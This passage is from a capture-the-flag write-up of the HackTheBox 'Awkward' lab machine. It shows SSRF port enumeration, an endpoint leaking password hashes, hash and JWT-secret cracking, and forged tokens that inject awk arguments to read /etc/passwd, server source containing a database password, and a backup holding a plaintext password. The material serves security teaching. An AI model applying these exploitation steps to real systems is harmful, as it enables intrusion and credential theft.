+</code></pre></div><p>To enumerate all internal ports, I used this short Bash script:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">enum_port()</span><span class="mtk1"> {</span>
+<span class="mtk1">        curl </span><span class="mtk4">"hat-valley.htb/api/store-status?url='</span><span class="mtk4 detected-link">http://127.0.0.1:</span><span class="mtk1 detected-link">$1</span><span class="mtk4">'"</span><span class="mtk1"> -H </span><span class="mtk4">'Cookie: token=admin'</span><span class="mtk1"> -s </span><span class="mtk5">|</span><span class="mtk1"> md5sum</span>  
+<span class="mtk1">}</span>
+
+<span class="mtk5">for</span><span class="mtk1"> i </span><span class="mtk5">in</span><span class="mtk1"> {1..65535}</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">do</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$i</span><span class="mtk4">: $(enum_port </span><span class="mtk1">$i</span><span class="mtk4">)"</span><span class="mtk1"> </span><span class="mtk5">&amp;</span>
+<span class="mtk5">done</span>
+<span class="mtk7">wait</span>
+</code></pre></div><p>And we see three ports:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">enum.sh</span> | <span class="code-dark-green">grep</span> -v d41d8cd98f00b204e9800998ecf8427e  
+80: 57d3ff079054da366e3410714f7cc5b7  -
+3002: a503f842648cc7054781898381629fc9  -
+8080: eec43f2e72fc1fa2be35d0ba190ea4fd  -
+</code></pre></div><p>Port 80 is the main website, which redirects to port 8080 (the Vue.js application). On port 3002 we find a large HTML document, so let&rsquo;s download it and render it on the browser:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"hat-valley.htb/api/store-status?url='http://127.0.0.1:3002'"</span> -H <span class="code-dark-yellow">'Cookie: token=admin'</span> -so index.html  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+</code></pre></div><p>It is some kind of API documentation:</p><p><img src="/images/HTB/Awkward/Awkward-8.png" alt="Awkward 8"></p><h3 id="static-code-analysis">Static code analysis</h3><p>All of the requests require a valid JWT token, and we don&rsquo;t have any credentials yet. However, the last request looks vulnerable:</p><p><img src="/images/HTB/Awkward/Awkward-9.png" alt="Awkward 9"></p><p>If we omit the <code>token</code> cookie, <code>user_token</code> will be <code>undefined</code> (a falsy value in JavaScript), so the program will skip the first <code>if</code> statement. Then, since <code>auth_failed</code> is initialized as <code>false</code>, the second <code>if</code> won&rsquo;t be executed. Therefore, the server will send us all the <code>users</code> table (<code>SELECT * from users</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/staff-details -s | <span class="code-dark-green">jq</span>
+<span class="code-white">[</span>
+<span class="code-white">  {</span>
+<span class="code-white">    <span class="code-blue">"user_id"</span>: </span>1<span class="code-white">,</span>
+<span class="code-white">    <span class="code-blue">"username"</span>: <span class="code-dark-green">"christine.wool"</span>,</span>
+<span class="code-white">    <span class="code-blue">"password"</span>: <span class="code-dark-green">"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"</span>,</span>  
+<span class="code-white">    <span class="code-blue">"fullname"</span>: <span class="code-dark-green">"Christine Wool"</span>,</span>
+<span class="code-white">    <span class="code-blue">"role"</span>: <span class="code-dark-green">"Founder, CEO"</span>,</span>
+<span class="code-white">    <span class="code-blue">"phone"</span>: <span class="code-dark-green">"0415202922"</span></span>
+<span class="code-white">  },</span>
+<span class="code-white">  {</span>
+<span class="code-white">    <span class="code-blue">"user_id"</span>: </span>2<span class="code-white">,</span>
+<span class="code-white">    <span class="code-blue">"username"</span>: <span class="code-dark-green">"christopher.jones"</span>,</span>
+<span class="code-white">    <span class="code-blue">"password"</span>: <span class="code-dark-green">"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"</span>,</span>
+<span class="code-white">    <span class="code-blue">"fullname"</span>: <span class="code-dark-green">"Christopher Jones"</span>,</span>
+<span class="code-white">    <span class="code-blue">"role"</span>: <span class="code-dark-green">"Salesperson"</span>,</span>
+<span class="code-white">    <span class="code-blue">"phone"</span>: <span class="code-dark-green">"0456980001"</span></span>
+<span class="code-white">  },</span>
+<span class="code-white">  {</span>
+<span class="code-white">    <span class="code-blue">"user_id"</span>: </span>3<span class="code-white">,</span>
+<span class="code-white">    <span class="code-blue">"username"</span>: <span class="code-dark-green">"jackson.lightheart"</span>,</span>
+<span class="code-white">    <span class="code-blue">"password"</span>: <span class="code-dark-green">"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"</span>,</span>
+<span class="code-white">    <span class="code-blue">"fullname"</span>: <span class="code-dark-green">"Jackson Lightheart"</span>,</span>
+<span class="code-white">    <span class="code-blue">"role"</span>: <span class="code-dark-green">"Salesperson"</span>,</span>
+<span class="code-white">    <span class="code-blue">"phone"</span>: <span class="code-dark-green">"0419444111"</span></span>
+<span class="code-white">  },</span>
+<span class="code-white">  {</span>
+<span class="code-white">    <span class="code-blue">"user_id"</span>: </span>4<span class="code-white">,</span>
+<span class="code-white">    <span class="code-blue">"username"</span>: <span class="code-dark-green">"bean.hill"</span>,</span>
+<span class="code-white">    <span class="code-blue">"password"</span>: <span class="code-dark-green">"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"</span>,</span>
+<span class="code-white">    <span class="code-blue">"fullname"</span>: <span class="code-dark-green">"Bean Hill"</span>,</span>
+<span class="code-white">    <span class="code-blue">"role"</span>: <span class="code-dark-green">"System Administrator"</span>,</span>
+<span class="code-white">    <span class="code-blue">"phone"</span>: <span class="code-dark-green">"0432339177"</span></span>
+<span class="code-white">  }</span>
+<span class="code-white">]</span>
+</code></pre></div><p>Incredible! Let&rsquo;s take those hashes and try to crack them using <a href="https://crackstation.net/">crackstation.net</a>:</p><p><img src="/images/HTB/Awkward/Awkward-10.png" alt="Awkward 10"></p><h2 id="foothold">Foothold</h2><p>Well, one is enough. Now we can access using credentials <code>christopher.jones:chris123</code>:</p><p><img src="/images/HTB/Awkward/Awkward-11.png" alt="Awkward 11"></p><p>Also, we have a valid JWT token, so we can access other endpoints like <code>/api/submit-leave</code> and <code>/api/all-leave</code>:</p><p><img src="/images/HTB/Awkward/Awkward-12.png" alt="Awkward 12"></p><p><img src="/images/HTB/Awkward/Awkward-13.png" alt="Awkward 13"></p><p>Interesting parts are indicated with arrows. There are some system commands being executed and some user input is involved. Although there is a list of bad characters, there are some special characters allowed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; from string import punctuation
+&gt;&gt;&gt; set(punctuation).difference(set([";","&","|","&gt;","&lt;","*","?","`","$","(",")","{","}","[","]","!","#"]))  
+{"'", '.', ':', '\\', '%', ',', '+', '/', '^', '_', '~', '=', '-', '"', '@'}
+</code></pre></div><p>None of them seems to be useful to inject commands at <code>/api/submit-leave</code>, since none of them allows us to concatenate another command.</p><h3 id="finding-a-lfr-vulnerability">Finding a LFR vulnerability</h3><p>However, we might try to read files with <code>awk</code> in <code>/api/all-leave</code>. Let&rsquo;s do normal requests to see how this API endpoints work:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/submit-leave -d <span class="code-dark-yellow">'{"reason":"asdf","start":"0","end":"9"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -H <span class="code-dark-yellow">'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc2MjM2MDYzfQ.MEmHAj5SRWVgp31npj29Someqy37gUwiyImwPBKxUVE'</span>  
+Successfully added new leave request
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/all-leave -H <span class="code-dark-yellow">'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc2MjM2MDYzfQ.MEmHAj5SRWVgp31npj29Someqy37gUwiyImwPBKxUVE'</span>
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+christopher.jones,asdf,0,9,Pending
+</code></pre></div><p>So, the server prints all lines of the CSV file that match with our username using <code>awk</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk4">"awk '/"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">"/' /var/www/private/leave_requests.csv"</span>  
+</code></pre></div><p>Notice that we are allowed to enter single quotes (<code>'</code>) and slashes (<code>/</code>). So, at least we can escape the quotation context and add another file to read. This is the objective:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> asdf &gt; leave_requests.csv
+
+<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> secret &gt; secret_file
+
+<span class="code-cyan">$</span> <span class="code-dark-green">awk</span> <span class="code-dark-yellow">'//'</span> <span class="mtku">secret_file</span> <span class="code-dark-yellow">''</span> <span class="mtku">leave_requests.csv</span>  
+secret
+asdf
+</code></pre></div><p>Therefore, we need to control the <code>user</code> variable to enter <code>/' &lt;file> '</code>, which comes from the JWT token. Hence, we must be able to forge JWT tokens. One way of doing this is trying to crack the JWT token we have with <code>rockyou.txt</code>. Something like this (using Node.js REPL):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">npm</span> install jsonwebtoken
+...
+
+<span class="code-cyan">$</span> <span class="code-dark-green">node</span>
+Welcome to Node.js v19.6.0.
+Type ".help" for more information.
+&gt; const fs = require('fs')
+<span class="code-grey">undefined</span>
+&gt; const jwt = require('jsonwebtoken')
+<span class="code-grey">undefined</span>
+&gt; for (const password of fs.readFileSync('rockyou.txt').toString().split('\n')) {
+...   try {
+...     jwt.verify('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc2MjM2MDYzfQ.MEmHAj5SRWVgp31npj29Someqy37gUwiyImwPBKxUVE', password)  
+...     console.log(password)
+...   } catch (err) { }
+... }
+123beany123
+<span class="code-grey">undefined</span>
+</code></pre></div><p>There we have the token secret. At this point we are able to forge JWT tokens and therefore control the <code>user</code> variable. As a proof of concept, let&rsquo;s try to read <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span>
+Welcome to Node.js v19.6.0.
+Type ".help" for more information.
+&gt; const jwt = require('jsonwebtoken')
+<span class="code-grey">undefined</span>
+&gt; jwt.sign({ username: "/' /etc/passwd '" }, '123beany123')
+<span class="code-dark-green">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzYyMzg0OTd9.mmbm4oVDXAWi_sO1tregfTL24yN5k3bxmEg9izlDuEA'</span>
+&gt; .exit
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/all-leave -H <span class="code-dark-yellow">'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzYyMzg0OTd9.mmbm4oVDXAWi_sO1tregfTL24yN5k3bxmEg9izlDuEA'</span>  
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
+systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
+tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
+whoopsie:x:117:124::/nonexistent:/bin/false
+sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
+colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
+gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bean:x:1001:1001:,,,:/home/bean:/bin/bash
+christine:x:1002:1002:,,,:/home/christine:/bin/bash
+postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
+mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:999::/var/log/laurel:/bin/false
+</code></pre></div><p>At this point, I decided to write a simple Node.js script to exploit the Local File Read (LFR) vulnerability and read files from the server using the above procedure: <a href="https://github.com/7Rocky/HackTheBox-scripts/blob/main/Machines/Awkward/readFile.js"><code>readFile.js</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/blob/main/Machines/Awkward#readFilejs">here</a>).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /etc/hosts
+127.0.0.1       localhost hat-valley.htb store.hat-valley.htb  
+127.0.0.1       awkward
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div><p>We can read source code since we have the full path from previous errors:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /var/www/hat-valley.htb/server/server.js | <span class="code-dark-green">head</span> -30
+const express = require('express')
+const bodyParser = require('body-parser')
+const cors = require('cors')
+const jwt = require('jsonwebtoken')
+const app = express()
+const axios = require('axios')
+const { exec } = require("child_process");
+const path = require('path')
+const sha256 = require('sha256')
+const cookieParser = require("cookie-parser")
+app.use(bodyParser.json())
+app.use(cors())
+app.use(cookieParser())
+const mysql = require('mysql')
+const { response } = require('express')
+const connection = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',
+  password: 'SQLDatabasePassword321!',
+  database: 'hatvalley',
+  stringifyObjects: true
+})
+const port = 3002
+
+const TOKEN_SECRET = "123beany123"
+
+app.post('/api/login', (req, res) =&gt; {
+  const {username, password} = req.body
+  connection.query(
+    'SELECT * FROM users WHERE username = ? AND password = ?', [ username, sha256(password) ],  
+</code></pre></div><p>So we see the password for MySQL. But it is useless&mldr;</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /var/www/private/leave_requests.csv
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No  
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+</code></pre></div><p>It looks like <code>bean.hill</code> and <code>christopher.jones</code> just broke up&mldr; Anyway, let&rsquo;s continue. From the <code>/etc/passwd</code> file we see that <code>bean</code> and <code>christine</code> are valid users:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /etc/passwd | <span class="code-dark-green">grep</span> sh$
+root:x:0:0:root:/root:/bin/ba<span class="code-red">sh</span>
+bean:x:1001:1001:,,,:/home/bean:/bin/ba<span class="code-red">sh</span>
+christine:x:1002:1002:,,,:/home/christine:/bin/ba<span class="code-red">sh  
+</code></pre></div><h3 id="finding-a-plaintext-password">Finding a plaintext password</h3><p>We can try to access to common files in their home directories. For instance, <code>.bashrc</code>. If we look at <code>alias</code> commands, we find something interesting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /home/bean/.bashrc | <span class="code-dark-green">grep</span> alias
+# enable color support of ls and also add handy <span class="code-red">alias</span>es
+    <span class="code-red">alias</span> ls='ls --color=auto'
+    #<span class="code-red">alias</span> dir='dir --color=auto'
+    #<span class="code-red">alias</span> vdir='vdir --color=auto'
+    <span class="code-red">alias</span> grep='grep --color=auto'
+    <span class="code-red">alias</span> fgrep='fgrep --color=auto'
+    <span class="code-red">alias</span> egrep='egrep --color=auto'
+# some more ls <span class="code-red">alias</span>es
+<span class="code-red">alias</span> ll='ls -alF'
+<span class="code-red">alias</span> la='ls -A'
+<span class="code-red">alias</span> l='ls -CF'
+<span class="code-red">alias</span> backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
+# Add an "alert" <span class="code-red">alias</span> for long running commands.  Use like so:
+<span class="code-red">alias</span> alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'  
+# ~/.bash_<span class="code-red">alias</span>es, instead of adding them here directly.
+if [ -f ~/.bash_<span class="code-red">alias</span>es ]; then
+    . ~/.bash_<span class="code-red">alias</span>es
+</code></pre></div><p>Let&rsquo;s read <code>/home/bean/Documents/backup_home.sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /home/bean/Documents/backup_home.sh  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+<span class="mtk1">mkdir /home/bean/Documents/backup_tmp</span>
+<span class="mtk7">cd</span><span class="mtk1"> /home/bean</span>
+<span class="mtk1">tar --exclude=</span><span class="mtk4">'.npm'</span><span class="mtk1"> --exclude=</span><span class="mtk4">'.cache'</span><span class="mtk1"> --exclude=</span><span class="mtk4">'.vscode'</span><span class="mtk1"> -czvf /home/bean/Documents/backup_tmp/bean_backup</span><span class="mtk1">.tar.gz </span><span class="mtk7">.</span>  
+<span class="mtk1">date </span><span class="mtk5">&gt;</span><span class="mtk1"> /home/bean/Documents/backup_tmp/time.txt</span>
+<span class="mtk7">cd</span><span class="mtk1"> /home/bean/Documents/backup_tmp</span>
+<span class="mtk1">tar -czvf /home/bean/Documents/backup/bean_backup_</span><span class="mtk1">final.tar.gz </span><span class="mtk7">.</span>
+<span class="mtk1">rm -r /home/bean/Documents/backup_tmp</span>
+</code></pre></div><p>We would like to download that <code>.tar.gz</code> backup file. Since this is a binary file, let&rsquo;s use the manual way:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span>
+Welcome to Node.js v19.6.0.
+Type ".help" for more information.
+&gt; const jwt = require('jsonwebtoken')
+<span class="code-grey">undefined</span>
+&gt; jwt.sign({ username: "/' /home/bean/Documents/backup/bean_backup_final.tar.gz '" }, '123beany123')
+<span class="code-dark-green">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NjI0MDcxM30.Y-nvN-avH-8BKiqrd6RVa7gif-RsuRXh1LfNksBi5iA'</span>
+&gt; .exit
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> hat-valley.htb/api/all-leave -H <span class="code-dark-yellow">'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NjI0MDcxM30.Y-nvN-avH-8BKiqrd6RVa7gif-RsuRXh1LfNksBi5iA'</span> -so bean_backup_final.tar.gz  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">bean_backup_final.tar.gz</span>
+bean_backup_final.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 167772320
+</code></pre></div><p>Alright, let&rsquo;s decompress it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xvfz <span class="mtku">bean_backup_final.tar.gz</span>  
+x ./
+x ./bean_backup.tar.gz
+x ./time.txt
+</code></pre></div><p>Now we have another <code>.tar.gz</code> file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xvfz <span class="mtku">bean_backup.tar.gz</span>
+x ./
+x ./Templates/
+x ./.ssh/
+x ./Pictures/
+x ./.config/
+x ./.config/xpad/
+...
+x ./.config/user-dirs.locale
+x ./Videos/
+x ./.gnupg/
+x ./.gnupg/pubring.kbx
+x ./.gnupg/trustdb.gpg
+x ./.local/
+x ./.local/share/
+...
+x ./.local/share/nano/
+x ./.local/share/session_migration-ubuntu
+x ./Music/
+x ./snap/
+x ./snap/snapd-desktop-integration/
+...
+x ./snap/snapd-desktop-integration/common/
+x ./.bashrc
+x ./Downloads/
+x ./.bash_history
+x ./.profile
+x ./Desktop/
+x ./Public/
+x ./.bash_logout
+x ./Documents/
+x ./Documents/backup_tmp/
+x ./Documents/backup_tmp/bean_backup.tar.gz  
+x ./Documents/backup_home.sh
+x ./Documents/backup/
+</code></pre></div><p>If we look for files that contain the username <code>bean</code> as a string, we find these ones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">grep</span> -nri bean <span class="mtku">.</span>
+./.config/gtk-3.0/bookmarks:1:file:///home/<span class="code-red">bean</span>/Documents
+./.config/gtk-3.0/bookmarks:2:file:///home/<span class="code-red">bean</span>/Music
+./.config/gtk-3.0/bookmarks:3:file:///home/<span class="code-red">bean</span>/Pictures
+./.config/gtk-3.0/bookmarks:4:file:///home/<span class="code-red">bean</span>/Videos
+./.config/gtk-3.0/bookmarks:5:file:///home/<span class="code-red">bean</span>/Downloads
+./.config/xpad/content-DS1ZS1:9:<span class="code-red">bean</span>.hill
+./.config/xpad/content-DS1ZS1:10:014mr<span class="code-red">bean</span>rules!#P
+./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-0:6:IBUS_ADDRESS=unix:abstract=/home/<span class="code-red">bean</span>/.cache/ibus/dbus-aFcG5feC,guid=3dec9de0e2cbb2442d14006463230e0b
+./.config/ibus/bus/ee6a821b27764b4d9e547b4690827539-unix-wayland-0:6:IBUS_ADDRESS=unix:abstract=/home/<span class="code-red">bean</span>/.cache/ibus/dbus-aFcG5feC,guid=3dec9de0e2cbb2442d14006463230e0b  
+./.bashrc:96:alias backup_home='/bin/bash /home/<span class="code-red">bean</span>/Documents/backup_home.sh'
+Binary file ./.readFile.js.swp matches
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:8:XDG_DESKTOP_DIR="/home/<span class="code-red">bean</span>/Desktop"
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:9:XDG_DOWNLOAD_DIR="/home/<span class="code-red">bean</span>/Downloads"
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:10:XDG_TEMPLATES_DIR="/home/<span class="code-red">bean</span>/Templates"
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:11:XDG_PUBLICSHARE_DIR="/home/<span class="code-red">bean</span>/Public"
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:12:XDG_DOCUMENTS_DIR="/home/<span class="code-red">bean</span>/Documents"
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:13:XDG_MUSIC_DIR="/home/<span class="code-red">bean</span>/Music"
+./snap/snapd-desktop-integration/14/.config/user-dirs.dirs:14:XDG_PICTURES_DIR="/home/<span class="code-red">bean</span>/Pictures"
